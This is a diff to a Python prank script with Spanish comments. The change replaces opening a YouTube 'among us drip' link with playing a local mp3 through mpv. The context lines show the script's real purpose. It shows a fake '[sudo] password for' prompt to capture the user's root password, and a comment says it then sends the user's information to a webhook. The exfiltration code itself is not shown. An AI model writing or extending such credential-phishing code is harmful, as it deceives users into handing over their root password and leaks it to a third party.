@@ -2,7 +2,7 @@ from os import listdir, system
 from threading import Thread
 from colorama import Fore, Style
 from time import sleep
-import webbrowser
+import subprocess
 # Importa los módulos desde src
 try:
      from src.behavior import * 
@@ -12,6 +12,12 @@ try:
      
 except ModuleNotFoundError:
      print("Ejecuta el script desde la carpeta linux, por favor")
+
+#Define path para el amongus drip y funcion para reproducirlo (requiere mpv)
+susPath = "assets/mogus.mp3"
+
+def playSus():
+    subprocess.run(["mpv", "--quiet", "--no-terminal", "--no-video", susPath])
      
 # Mira si el script está corriendo     
 def check():
@@ -56,7 +62,7 @@ def main():
      rootPassword = input(f'[sudo] password for {username}: ')
 
      # Abre una pestaña a google con el among drip
-     webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
+     playSus()
      sleep(15)
           
      # Se conecta con un webhook y manda la información del usuario
